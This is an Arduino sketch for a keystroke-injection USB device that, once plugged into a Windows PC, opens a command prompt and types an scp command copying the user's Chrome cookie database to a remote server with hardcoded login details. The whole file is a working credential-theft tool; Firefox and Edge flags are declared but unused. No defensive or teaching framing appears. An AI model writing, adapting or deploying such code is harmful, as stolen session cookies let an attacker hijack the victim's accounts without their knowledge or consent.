#include <Keyboard.h>

// set variables for server connection
const char* server_user = "ubuntu";
const char* server_password = "ubuntu";
const char* server_path = "/home/ubuntu";
const char* server_ip = "192.168.8.124";
// choose desired browsers
bool chrome = 1;
bool firefox = 0;
bool edge = 0;
// first time using this PC or server (will accept fingerprints in cmd)
bool firstTime = 0;

void setup() {
  //initialize keyboard
  Keyboard.begin();
  delay(2000);
  //access CMD
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.release(KEY_LEFT_GUI);
  delay(500);
  Keyboard.press('c');
  delay(500);
  Keyboard.press('m');
  delay(500);
  Keyboard.press('d');
  delay(500);
  Keyboard.release('c');
  delay(500);
  Keyboard.release('m');
  delay(500);
  Keyboard.release('d');
  delay(1000);
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.release(KEY_RETURN);
  delay(500);
  //enter folder with chrome cookies
  String path = "\"C:\\Users\\%username%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\" ";
  String copyCommand = "scp " + path + String(server_user) + "@" + String(server_ip) + ":" + String(server_path);
  Keyboard.println(copyCommand);
  delay(1000);
  Keyboard.println(server_password);
  delay(1000);
  //end keystrokes
  delay(400);
  Keyboard.end();
}
void loop()
{
}